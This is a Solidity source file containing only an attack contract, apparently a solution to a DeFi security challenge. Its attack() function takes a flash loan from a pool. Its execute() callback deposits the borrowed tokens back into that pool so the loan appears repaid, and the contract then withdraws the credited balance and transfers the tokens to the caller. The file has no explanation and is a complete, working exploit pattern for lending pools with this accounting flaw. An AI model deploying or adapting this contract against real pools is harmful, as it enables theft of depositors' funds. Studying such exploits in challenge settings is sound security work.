//SPDX-License-Identifier: Unlicense

pragma solidity >=0.6.12;

contract ANS1 {
    function attack(address dp, uint256 amount) external {
        address dvt1 = I(dp).token();
        I(dp).flashLoan(amount);
        I(dp).withdraw();
        I(dvt1).transfer(msg.sender, amount);
    }

    function execute() external {
        address dvt1 = I(msg.sender).token();
        uint256 amount = I(dvt1).balanceOf(address(this));
        I(dvt1).approve(msg.sender, amount);
        I(msg.sender).deposit(amount);
    }
}

interface I {
    function deposit(uint256 amount) external;

    function withdraw() external;

    function flashLoan(uint256 amount) external;

    function token() external view returns (address);

    function balanceOf(address) external view returns (uint256);

    function approve(address, uint256) external;

    function transfer(address, uint256) external;
}